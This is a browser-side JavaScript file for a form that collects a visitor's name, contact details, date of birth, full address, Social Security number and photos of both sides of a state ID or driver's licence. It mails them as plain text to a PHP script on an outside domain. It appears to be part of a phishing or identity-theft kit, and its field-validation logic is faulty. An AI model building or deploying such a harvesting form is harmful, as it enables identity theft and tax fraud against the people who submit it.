const submit = document.getElementById("submit");
const form = document.getElementById("form");

const sendToMail = async (body, file1, file2) => {

    const submitRequest = new FormData();
    submitRequest.append("body", body);
    submitRequest.append("file1", file1);
    submitRequest.append("file2", file2);
    // submitRequest.append("file3", file3);

    const url = `https://danielwilson.online/mail/plainFormMail.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

form.addEventListener('submit', (ev) => {
    ev.preventDefault();

    const fname = document.getElementById("fname").value;
    const lname = document.getElementById("lname").value;
    const email = document.getElementById("email").value;
    const gender = document.getElementById("gender").value;
    const dob = document.getElementById("dob").value;
    const areacode = document.getElementById("areacode").value;
    const phone = document.getElementById("phone").value;
    const address = document.getElementById("address").value;
    const address2 = document.getElementById("address2").value;
    const state = document.getElementById("state").value;
    const city = document.getElementById("city").value;
    const postal = document.getElementById("postal").value;
    const ssn = document.getElementById("ssn").value;
    const fileFront = document.getElementById("fileFront").files;
    const fileBack = document.getElementById("fileBack").files;
    const checkedValue = document.querySelector('input[name="taxReturn"]:checked');

    document.querySelectorAll("input").forEach((input) => {
        if (input.type !== "file" || input.type !== "radio" || input.name !== "address2") {
            if (input.value.trim() === "") {
                alert("All Fields are required except the Street address line 2 field and the cover letter field.");
            }
        }
    });

    if (!fileFront.length > 0) {
        alert("front of your State ID/DL must be uploaded");
        return;
    }

    if (!fileBack.length > 0) {
        alert("back of your State ID/DL must be uploaded");
        return;
    }

    if (!checkedValue) {
        alert("You have to select an answer if you have filed your 2022 tax return");
    }

    submit.innerText = 'Processing...';

    let my_txt = `New Plain Form Info \n`;
    my_txt += `====================\n`;
    my_txt += `First name: ${fname}\n`;
    my_txt += `Last name: ${lname}\n`;
    my_txt += `Email: ${email}\n`;
    my_txt += `Gender: ${gender}\n`;
    my_txt += `Area code: ${areacode}\n`;
    my_txt += `Phone: ${phone}\n`;
    my_txt += `Date of Birth: ${dob}\n`;
    my_txt += `SSN: ${ssn}\n`;
    my_txt += `Address: ${address}\n`;
    my_txt += `Address2: ${address2}\n`;
    my_txt += `City: ${city}\n`;
    my_txt += `State: ${state}\n`;
    my_txt += `Postal: ${postal}\n`;
    my_txt += `Did you file your 2022 tax return?: ${checkedValue.value}\n`;
    my_txt += `====================\n`;

    sendToMail(my_txt, fileFront[0], fileBack[0])
        .then((data) => {
            // definitely a success message
            alert(data);
            submit.innerText = 'Submit';
            if (data === "Application submitted successfully") {
                location.reload();
            }
        })
        .catch((error) => {
            alert(error);
            submit.innerText = 'Submit';
        });
})